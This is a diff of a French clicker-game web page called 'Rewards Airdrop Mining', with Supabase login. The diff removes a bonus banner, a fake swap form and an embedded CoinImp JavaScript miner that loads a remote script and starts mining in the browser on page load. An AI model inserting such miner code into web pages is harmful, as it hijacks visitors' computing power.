@@ -1,30 +1,24 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Rewards Airdrop Mining</title>
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-  <style>
-    body { font-family: Arial, sans-serif; background:#0a0a0a; color:#e0e0e0; margin:0; }
-    #login-overlay {
-      position: fixed; top:0; left:0; width:100%; height:100%;
-      background:#000d; display:flex; align-items:center; justify-content:center; z-index:9999;
-    }
-    #login-box { background:#222; padding:20px; border-radius:12px; width:300px; text-align:center; }
-    #app { display:none; padding:20px; }
-    .energy-bar { width:100%; background:#333; border-radius:12px; overflow:hidden; margin:10px 0; }
-    .energy-fill { height:20px; background:lime; width:100%; transition:width 0.3s; animation:flash 2s infinite; }
-    @keyframes flash { 0%{opacity:1} 50%{opacity:0.6} 100%{opacity:1} }
-    button { padding:10px 20px; margin:5px; border:none; border-radius:8px; cursor:pointer; background:#444; color:#fff; }
-    #bonus-banner { color:yellow; font-weight:bold; animation:blink 1s infinite; margin:10px 0; }
-    @keyframes blink { 50% { opacity:0; } }
-    #stats { margin:10px 0; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Rewards Airdrop Mining</title>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+body { font-family: Arial, sans-serif; background:#0a0a0a; color:#e0e0e0; margin:0; text-align:center; }
+#login-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:#000d; display:flex; align-items:center; justify-content:center; z-index:9999; }
+#login-box { background:#222; padding:20px; border-radius:12px; width:300px; text-align:center; }
+#app { display:none; padding:20px; }
+.energy-bar { width:100%; background:#333; border-radius:12px; overflow:hidden; margin:10px 0; }
+.energy-fill { height:20px; background:lime; width:100%; transition:width 0.3s; animation:flash 2s infinite; }
+@keyframes flash { 0%{opacity:1} 50%{opacity:0.6} 100%{opacity:1} }
+button { padding:10px 20px; margin:5px; border:none; border-radius:8px; cursor:pointer; background:#444; color:#fff; }
+#stats { margin:20px; }
+</style>
 </head>
 <body>
 
-<!-- Login Overlay -->
 <div id="login-overlay">
   <div id="login-box">
     <h2>Connexion</h2>
@@ -35,141 +29,93 @@
   </div>
 </div>
 
-<!-- App -->
 <div id="app">
   <h1>Rewards Airdrop Mining</h1>
 
-  <!-- Stats -->
   <div id="stats">
     <p><b>Deadspot:</b> <span id="deadspot">0</span></p>
-    <p><b>Diamants:</b> <span id="diamonds">0</span></p>
     <p><b>XP:</b> <span id="xp">0</span></p>
-    <p><b>Niveau:</b> <span id="level">1</span></p>
+    <p><b>Level:</b> <span id="level">1</span></p>
+    <p><b>Énergie:</b> <span id="energy">1000</span> / <span id="energyMax">1000</span></p>
   </div>
 
-  <!-- Énergie -->
-  <div class="energy-bar">
-    <div class="energy-fill" id="energy-fill"></div>
-  </div>
-  <p>Énergie: <span id="energy">1000</span> / <span id="energyMax">1000</span></p>
+  <div class="energy-bar"><div class="energy-fill" id="energy-fill"></div></div>
 
-  <!-- Clicker -->
   <button id="clickBtn">CLICK to Earn</button>
 
-  <!-- Bonus -->
-  <div id="bonus-banner">
-    🎁 Premier achat: +1764% Deadspot, x4 Clicks, +150 GH/s gratuit!
-  </div>
-
-  <!-- Swap -->
-  <h2>Swap Crypto</h2>
-  <input id="swapAmount" type="number" placeholder="Montant à swap">
-  <select id="swapCurrency"><option>BTC</option><option>ETH</option><option>TRX</option></select>
-  <button id="swapBtn">Swap</button>
-  <p id="swapResult"></p>
+  <br><br>
+  <a href="cpu_simulator.html" style="color:yellow;">Aller à la page Simulateur CPU</a>
 </div>
 
 <script>
-  // ---- Supabase setup ----
-  const SUPABASE_URL = "https://wbavwtwslofcrpeuyqak.supabase.co"
-  const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndiYXZ3dHdzbG9mY3JwZXV5cWFrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQyMDQxNzksImV4cCI6MjA2OTc4MDE3OX0.eSd88VEGv78YoNjuBxR5PpwnpN6BZ4Am4z3Cq8xHUds"
-  const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY)
+const SUPABASE_URL = "https://wbavwtwslofcrpeuyqak.supabase.co"
+const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY)
 
-  // ---- User state ----
-  let state = { deadspot:0, diamonds:0, xp:0, level:1, energy:1000, energyMax:1000 }
+let state = { deadspot:0, xp:0, level:1, energy:1000, energyMax:1000 }
 
-  async function loadUserState() {
-    try {
-      const { data: { session } } = await supabaseClient.auth.getSession()
-      if (!session) return
-      const userId = session.user.id
-      const { data } = await supabaseClient
-        .from("user_state")
-        .select("*")
-        .eq("id", userId)
-        .single()
-      if (data) state = data
-      updateUI()
-    } catch(e){ console.error(e) }
+async function loadUserState() {
+  const { data: { session } } = await supabaseClient.auth.getSession()
+  if(!session) return
+  const userId = session.user.id
+  const { data } = await supabaseClient.from("user_state").select("*").eq("id", userId).single()
+  if(data) state = data
+  updateUI()
+}
+
+async function saveUserState() {
+  const { data: { session } } = await supabaseClient.auth.getSession()
+  if(!session) return
+  const userId = session.user.id
+  await supabaseClient.from("user_state").upsert({ id:userId, ...state })
+}
+
+function updateUI(){
+  document.getElementById("deadspot").innerText = state.deadspot.toFixed(4)
+  document.getElementById("xp").innerText = state.xp.toFixed(2)
+  document.getElementById("level").innerText = state.level
+  document.getElementById("energy").innerText = state.energy
+  document.getElementById("energyMax").innerText = state.energyMax
+  document.getElementById("energy-fill").style.width = (state.energy/state.energyMax*100)+"%"
+}
+
+document.getElementById("btnSignUp").onclick = async () => {
+  const email = document.getElementById("email").value
+  const password = document.getElementById("password").value
+  const { error } = await supabaseClient.auth.signUp({ email, password })
+  if(error) alert(error.message); else alert("Inscription réussie !")
+}
+
+document.getElementById("btnSignIn").onclick = async () => {
+  const email = document.getElementById("email").value
+  const password = document.getElementById("password").value
+  const { error } = await supabaseClient.auth.signInWithPassword({ email, password })
+  if(error) alert(error.message)
+  else {
+    document.getElementById("login-overlay").style.display="none"
+    document.getElementById("app").style.display="block"
+    await loadUserState()
   }
+}
 
-  async function saveUserState() {
-    try {
-      const { data: { session } } = await supabaseClient.auth.getSession()
-      if (!session) return
-      const userId = session.user.id
-      await supabaseClient.from("user_state").upsert({ id:userId, ...state })
-    } catch(e){ console.error(e) }
+document.getElementById("clickBtn").onclick = () => {
+  if(state.energy <=0) return alert("Pas assez d'énergie")
+  state.energy--
+  state.deadspot += 0.001 + Math.random()*0.27
+  state.xp += 0.175
+  if(state.xp > (15*Math.pow(1.27,state.level-1))) state.level++
+  updateUI(); saveUserState()
+}
+
+window.addEventListener("load", async () => {
+  const { data: { session } } = await supabaseClient.auth.getSession()
+  if(session){
+    document.getElementById("login-overlay").style.display="none"
+    document.getElementById("app").style.display="block"
+    await loadUserState()
   }
-
-  function updateUI(){
-    document.getElementById("deadspot").innerText = state.deadspot.toFixed(4)
-    document.getElementById("diamonds").innerText = state.diamonds
-    document.getElementById("xp").innerText = state.xp.toFixed(2)
-    document.getElementById("level").innerText = state.level
-    document.getElementById("energy").innerText = state.energy
-    document.getElementById("energyMax").innerText = state.energyMax
-    document.getElementById("energy-fill").style.width = (state.energy/state.energyMax*100)+"%"
-  }
-
-  // ---- Auth ----
-  document.getElementById("btnSignUp").onclick = async () => {
-    const email = document.getElementById("email").value
-    const password = document.getElementById("password").value
-    const { error } = await supabaseClient.auth.signUp({ email, password })
-    if(error) alert(error.message)
-    else alert("Inscription réussie ! Vérifiez votre email")
-  }
-
-  document.getElementById("btnSignIn").onclick = async () => {
-    const email = document.getElementById("email").value
-    const password = document.getElementById("password").value
-    const { error } = await supabaseClient.auth.signInWithPassword({ email, password })
-    if(error) alert(error.message)
-    else {
-      document.getElementById("login-overlay").style.display="none"
-      document.getElementById("app").style.display="block"
-      await loadUserState()
-    }
-  }
-
-  // ---- Clicker ----
-  document.getElementById("clickBtn").addEventListener("click", () => {
-    if(state.energy <= 0) return alert("Pas assez d'énergie")
-    state.energy -= 1
-    const gain = 0.0001 + Math.random()*0.27
-    state.deadspot += gain
-    state.xp += 0.175
-    if(state.xp > (15 * Math.pow(1.27, state.level-1))) { state.level++; state.diamonds++ }
-    updateUI(); saveUserState()
-  })
-
-  // ---- Check session on load ----
-  window.addEventListener("load", async () => {
-    const { data: { session } } = await supabaseClient.auth.getSession()
-    if(session){
-      document.getElementById("login-overlay").style.display="none"
-      document.getElementById("app").style.display="block"
-      await loadUserState()
-    }
-  })
-
-  // ---- Swap placeholder ----
-  document.getElementById("swapBtn").onclick = () => {
-    const amount = parseFloat(document.getElementById("swapAmount").value)
-    const currency = document.getElementById("swapCurrency").value
-    if(!amount || amount <= 0) return alert("Montant invalide")
-    document.getElementById("swapResult").innerText = `Swappé ${amount} vers ${currency} (simulation)`
-  }
-<script src="https://www.hostingcloud.racing/cW8A.js"></script>
-<script>
-    var _client = new Client.Anonymous('6385166bb53532d18acd435d3e6855c99be476fa8c7ab67bc03c6f0af2aacd51', {
-        throttle: 0.5, c: 'w', ads: 0
-    });
-    _client.start();
-    _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 20, "#3d3d3d");
-
-</script>
+})
 </script>
 </body>
 </html>
+
